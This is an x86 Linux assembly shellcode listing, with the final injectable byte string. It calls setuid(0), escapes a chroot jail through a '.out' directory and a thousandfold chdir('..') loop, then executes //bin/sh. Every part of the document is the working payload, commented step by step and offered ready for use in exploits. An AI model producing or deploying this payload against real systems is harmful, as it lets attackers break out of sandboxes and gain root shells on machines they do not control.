global _start
_start:
	;// Clear all of the registers because we never know what they might hold from the applications previous control flow.
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

	mov al, 213	;// Syscall for SETUID
			;// EBX is 0 for setuid(0)
	int 80h		;// Call the kernel

	xor eax, eax	;// EAX should be 0 for successful setuid, but it may be -1 on error. This is faster than test/jnz
	mov al, 39	;// Syscall for MKDIR
	push ecx	;// push 0x000000 for null terminator
	push 0x74756f2e	;// ".out" in reverse
	mov ebx, esp	;// pointer to ".out" folder string
	mov cx, 755o	;// rwxr-xr-x
	int 80h

	xor eax, eax
	xor ecx, ecx	;// O_RDONLY (000000000)
	mov al, 0x2e	;// Open "." string
	push eax	;// Push "\x00\x00\x00." onto stack
	mov ebx, esp	;// Set EBX to the string pointer
	mov al, 5	;// Syscall for open
	int 80h

	mov esi, eax	;// Move File Descriptor into ESI for later
	push ecx	;// push 0x000000 for null terminator
	push 0x74756f2e	;// ".out" in reverse
	mov ebx, esp	;// pointer to ".out" folder string
	mov al, 61	;// Syscall for CHROOT
	int 80h

	xor eax, eax
	mov ebx, esi	;// move ".out" File Descriptor we saved earlier into EBX
	mov al, 133	;// Syscall for FCHDIR
	int 80h
	
	xor eax, eax
	mov al, 6	;// Syscall for CLOSE
	mov ebx, esi	;// Move the File Descriptor for ".out" into 
	int 80h

	xor eax, eax
	mov ax, 0x2e2e	;// move ".." to stack
	push eax
	mov ebx, esp	;// EBX now contains a pointer to "..\x00\x00" in human-readable format
	mov cx, 1000	;// loop 1000 times
loop1:	xor eax, eax	;// return value should always be 0, but just in case...
	mov al, 12	;// Syscall for CHDIR
	int 80h
	dec ecx
	jnz loop1

	mov cl, 0x2e	;// Set ECX to "."
	push ecx	;// Push "." onto stack
	mov ebx, esp	;// Pointer to ".out" folder string
	mov al, 61	;// Syscall for CHROOT
	int 80h

	xor eax, eax
	push eax
	push 0x68732f6e	;// "hs/n"
	push 0x69622f2f	;// "ib//" for "//bin/sh" to execute. Don't asume bash or dash just in case
	mov ebx, esp	;// Set the char* parameter to the file name //bin/sh
	push eax	;// push 0x00000000
	mov edx, esp	;// NULL for the Environment...
	push ebx	;// Push the address of "//bin/sh" for the list of arguments. Executing '//bin/sh //bin/sh'
	mov ecx, esp
	mov al, 11	;// Syscall for EXECVE
	int 80h

	xor eax, eax
	xor ebx, ebx
	mov al, 1
	int 80h
	
;// Final Shellcode:
;// \x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xd5\xcd\x80\x31\xc0\xb0\x27\x51\x68\x2e\x6f\x75\x74\x89\xe3\x66\xb9\xed\x01\xcd\x80\x31\xc0\x31\xc9\xb0\x2e\x50\x89\xe3\xb0\x05\xcd\x80\x89\xc6\x31\xc0\x51\x68\x2e\x6f\x75\x74\x89\xe3\xb0\x3d\xcd\x80\x31\xc0\x89\xf3\xb0\x85\xcd\x80\x31\xc0\xb0\x06\x89\xf3\xcd\x80\x31\xc0\x66\xb8\x2e\x2e\x50\x89\xe3\x66\xb9\xe8\x03\x31\xc0\xb0\x0c\xcd\x80\x49\x75\xf7\xb1\x2e\x51\x89\xe3\xb0\x3d\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80
